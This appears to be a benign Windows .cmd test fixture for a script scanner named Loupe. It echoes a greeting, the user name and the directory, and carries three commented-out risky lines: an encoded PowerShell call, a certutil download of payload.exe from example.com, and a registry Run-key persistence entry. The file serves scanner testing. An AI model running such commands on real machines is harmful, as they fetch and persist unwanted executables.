@echo off
REM Loupe example — benign .cmd file (distinct from example.bat)
REM This script just echoes a greeting; all risky commands below are commented out.

echo Hello from example.cmd
echo Current user: %USERNAME%
echo Current dir : %CD%

REM The following are commented-out only to exercise the script scanner:
REM powershell -EncodedCommand aGVsbG8=
REM certutil -urlcache -split -f http://example.com/payload.exe payload.exe
REM reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v demo /d demo.exe

exit /b 0
